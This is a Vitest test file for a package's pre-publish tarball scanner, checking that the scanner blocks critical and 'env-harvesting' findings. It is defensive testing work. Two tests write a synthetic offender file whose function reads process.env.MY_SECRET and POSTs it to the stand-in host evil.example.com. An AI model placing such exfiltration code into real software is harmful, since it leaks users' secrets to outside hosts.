import { describe, it, expect, afterAll } from 'vitest'
import { mkdtempSync, writeFileSync, mkdirSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'

const REPO_ROOT = resolve(fileURLToPath(import.meta.url), '..', '..', '..')

// scripts/scan-tarball.mjs is .mjs (no .d.ts companion). Vitest + jiti import
// it as ESM at runtime; the cast to a typed shape keeps the per-test
// assertions strongly typed without a wrapper module.
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const tarballModule: any = await import('../../scripts/scan-tarball.mjs')
const scanPublishedFiles = tarballModule.scanPublishedFiles as (
  rootDir?: string,
) => Promise<{
  scannedFiles: number
  critical: number
  warn: number
  info: number
  findings: Array<{
    ruleId: string
    severity: 'info' | 'warn' | 'critical'
    file: string
    line: number
    message: string
    evidence: string
  }>
}>

describe('scanner-check (Phase 03 D-04 acceptance bar half 1)', () => {
  it('finds zero critical findings in the published file set (post-Plan-01)', async () => {
    const summary = await scanPublishedFiles()
    if (summary.critical > 0) {
      // Print only ruleId + file:line + message — never findings[].evidence.
      // The evidence string contains the offending source line and could leak
      // secrets if the scanner's truncation ever changes (T-03-08).
      const offenders = summary.findings
        .filter((f) => f.severity === 'critical')
        .map((f) => `${f.ruleId} at ${f.file}:${f.line} — ${f.message}`)
        .join('\n  ')
      throw new Error(
        `Scanner found ${summary.critical} critical finding(s):\n  ${offenders}\n` +
          `Fix the source file(s) above; do NOT bypass this check (Plan 02 T-03-05).`,
      )
    }
    expect(summary.critical).toBe(0)
  })

  it('finds zero env-harvesting findings in bin/ or src/', async () => {
    const summary = await scanPublishedFiles()
    const envHarvesting = summary.findings.filter(
      (f) =>
        f.ruleId === 'env-harvesting' &&
        (f.file.includes('/bin/') || f.file.includes('/src/')),
    )
    // Compare names + locations only (no evidence) to keep the assertion
    // failure message free of source-line content.
    const summarized = envHarvesting.map((f) => ({
      ruleId: f.ruleId,
      file: f.file,
      line: f.line,
    }))
    expect(summarized).toEqual([])
  })

  it('package.json prepack invokes scripts/scan-tarball.mjs', () => {
    // Regression net: silently dropping the chain (e.g., during a future
    // build-script edit) would let `npm publish` ship critical findings.
    const pkg = JSON.parse(readFileSync(join(REPO_ROOT, 'package.json'), 'utf-8'))
    expect(pkg.scripts?.prepack).toMatch(/\bnode scripts\/scan-tarball\.mjs\b/)
  })

  it('regression net: poisoned file inside the published tree raises critical', async () => {
    // Codifies the manual negative-path proof from Phase 03 Plan 02. If a
    // future change weakens scanPublishedFiles (e.g., resolver returns a
    // wrong scanner, walk skips a published dir), this asserts that an
    // env-harvesting pattern in src/ is still caught against the REAL
    // published file set, not just a tmpdir.
    const harvesterPath = join(REPO_ROOT, 'src', '__scan_regression_DO_NOT_COMMIT__.tmp.ts')
    writeFileSync(
      harvesterPath,
      [
        'export async function harvest() {',
        '  const secret = process.env.MY_SECRET',
        '  await fetch("https://evil.example.com", { method: "POST", body: secret })',
        '}',
      ].join('\n'),
      'utf-8',
    )
    try {
      const summary = await scanPublishedFiles()
      expect(summary.critical).toBeGreaterThanOrEqual(1)
      const envHarvest = summary.findings.find(
        (f) => f.ruleId === 'env-harvesting' && f.file.includes('__scan_regression_DO_NOT_COMMIT__'),
      )
      expect(envHarvest).toBeDefined()
    } finally {
      rmSync(harvesterPath, { force: true })
    }
  })

  // Defensive cleanup in case a prior crashed run left the fixture in src/.
  afterAll(() => {
    rmSync(join(REPO_ROOT, 'src', '__scan_regression_DO_NOT_COMMIT__.tmp.ts'), { force: true })
  })

  it('positive control: scanner detects env-harvesting when present', async () => {
    // Create a temp dir mimicking a publish layout with a synthetic offender.
    // If this assertion ever fails, the resolver is returning the wrong
    // scanner (or no scanner) and the negative tests above pass trivially.
    const tmpRoot = mkdtempSync(join(tmpdir(), 'scanner-check-'))
    try {
      mkdirSync(join(tmpRoot, 'src'), { recursive: true })
      writeFileSync(
        join(tmpRoot, 'src', 'harvester.ts'),
        // Both halves of the env-harvesting rule: process.env access + fetch
        // call. Scanner flags this as critical (regex per-file).
        [
          'export async function harvest() {',
          '  const secret = process.env.MY_SECRET',
          '  await fetch("https://evil.example.com", { method: "POST", body: secret })',
          '}',
        ].join('\n'),
        'utf-8',
      )
      const summary = await scanPublishedFiles(tmpRoot)
      expect(summary.critical).toBeGreaterThanOrEqual(1)
      const envHarvest = summary.findings.find(
        (f) => f.ruleId === 'env-harvesting',
      )
      expect(envHarvest).toBeDefined()
      expect(envHarvest?.severity).toBe('critical')
    } finally {
      rmSync(tmpRoot, { recursive: true, force: true })
    }
  })
})
